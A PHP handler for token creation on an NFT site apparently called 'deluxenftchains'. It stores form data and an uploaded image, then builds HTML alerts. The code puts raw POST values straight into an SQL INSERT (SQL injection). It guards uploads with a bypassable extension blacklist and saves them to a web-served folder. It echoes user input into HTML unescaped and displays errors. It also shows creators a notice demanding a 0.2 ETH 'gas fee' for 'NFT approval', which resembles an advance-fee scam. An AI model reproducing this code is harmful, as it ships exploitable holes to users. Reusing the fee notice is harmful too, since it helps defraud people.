<?php
error_reporting(E_ALL);

// Enable the display of errors
ini_set('display_errors', 1);

session_start();

function generate_account_id($length)
{
    $characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
    $account_id_length = strlen($characters);
    $account_id = '';

    for ($i = 0; $i < $length; $i++) {
        $y = rand(0, $account_id_length - 1);
        $random_letters = $characters[$y];
        $account_id .= $random_letters;
    }
    return $account_id;
}

include 'connection.php';
if (isset($_POST['create'])) {
    $category = filter_var($_POST['category']);
    $product_name = filter_var($_POST['product_name']);
    $collection_name = filter_var($_POST['collection_name']);
    $username = filter_var($_POST['username']);
    $user_id = filter_var($_POST['user_id']);
    $price = filter_var($_POST['price']);
    $description = filter_var($_POST['description']);
    $status = filter_var($_POST['status']);
    $email = filter_var($_POST['email']);

    $collection_id = generate_account_id(10);
    date_default_timezone_set("Africa/Lagos");
    $reg_date = date("Y-m-d h:i:sa");

    $filename = $_FILES['photo']['name'];
    $tmp_name = $_FILES['photo']['tmp_name'];
    $fileSize = $_FILES['photo']['size'];

    $img_explode = explode('.', $filename);
    $img_ent = strtolower(end($img_explode));

    $disallowed_extensions = ['php', 'html', 'js', 'css'];

    if (!in_array($img_ent, $disallowed_extensions)) {
        if ($fileSize < 30000000) {
            $img = time() . $filename;
            if (move_uploaded_file($tmp_name, "../xpanel/uploads/nfts" . $img)) {
                $sql = "INSERT INTO `tokens`(`category`, `product_name`, `collection_name`, `username`, `user_id`, `price`, `photo`, `description`, `status`, `email`, `collection_id`, `reg_date`) VALUES ('$category','$product_name','$collection_name','$username','$user_id','$price','$img','$description','$status','$email','$collection_id','$reg_date')";
                $run2 = $connect->query($sql);

                if ($run2 == TRUE) {
                    $price_in_usd = $price * 3728.72;
                    $usd_price = number_format($price_in_usd);
                    $_SESSION['card_alert'] = '<div class="card swiper-slide flex w-72 shrink-0 justify-between rounded-xl border-l-4 border-default p-4 swiper-slide-active" role="group" aria-label="1 / 1" style="margin-right: 18px;">
                           <div class="col-lg-6">
                              <p class="font-medium tracking-wide text-slate-700 line-clamp-2 dark:text-navy-100">
                                 ' . $username . ' </p>
                              <div class="h-16 w-16">
                                 <img class="mask is-squircle" src="../xpanel/uploads/nfts' . $img . '" alt="avatar">
                              </div>
                              <p></p>
                              <small><b>Category:</b>' . $category . '</small> <br>
                              <a href="#" class="mt-0.5 text-xs+ text-slate-400 hover:text-slate-800 dark:text-navy-300 dark:hover:text-navy-100">
                                ' . $reg_date . ' </a>
                              <p class="text-xl font-medium tracking-wide text-slate-700 line-clamp-2 dark:text-navy-100">
                                   $' . $usd_price . ' | <span class="font-semibold text-slate-700 dark:text-navy-100">
                                    <i class="fa-brands fa-ethereum text-sm+"></i>
                                   ' . $price . '  ETH
                                 </span>
                              </p>
                           </div>
                           <div class="">
                                 <div x-tooltip.primary="' . $status . '" class="progress h-1 bg-slate-150 dark:bg-navy-500">
                                    <div class="is-indeterminate relative w-4/12 rounded-full bg-warning"></div>
                                 </div>
                                 <div class="mt-2 flex items-center justify-between">
                                    Status: <p class="font-medium text-warning">' . $status . '</p>
                                 </div>
                              </div>
                        </div>';
                    $_SESSION['billing_alert'] = '<div class="rounded-lg bg-gradient-to-br from-amber-400 to-orange-600 px-4 py-4 text-white sm:px-5">
            <div>
              <h2 class="text-lg font-medium tracking-wide line-clamp-1">
               Important Notice for NFT Creator
              </h2>
            </div>
            <div class="pt-2">
              <p>
                Minting your artwork on deluxenftchains? A gas fee of 0.2 ETH is required for NFT approval. Clear this fee to proceed.

Thank you,
deluxenftchains Team
              </p>
            </div>
          </div>';
                    $_SESSION['token_alert'] = '<div x-data="{isShow:true}" :class="!isShow &amp;&amp; " class="mt-1 alert flex items-center justify-between overflow-hidden rounded-lg border border-success text-success">
                          <div class="flex">
                             <div class="px-4 py-3 sm:px-5 text-center"><b>' . $product_name . ' Created Successfully</b></div>
                          </div>
                          <div class="px-2">
                             <button @click="isShow = false; setTimeout(()=>$root.remove(),300)" class="btn h-7 w-7 rounded-full p-0 font-medium text-success border-success">
                                <i class="fa fa-close"></i>
                             </button>
                          </div>
                       </div>';
                    echo '<script>alert("Token Created Successful");window.location.href="../dashboard/create-token.php";</script>';
                    exit();
                } else {
                    echo '<script>alert("Failed To Create Token");window.location.href="../dashboard/create-token.php";</script>';
                    exit();
                }
            }
        } else {
            $_SESSION['signup_error'] = "File is too big";
        }
    } else {
        $_SESSION['signup_error'] = "Upload a correct image";
    }
} else {
    echo '<script>alert("Access denied");window.location.href="../dashboard/home.php";</script>';
    exit();
}
?>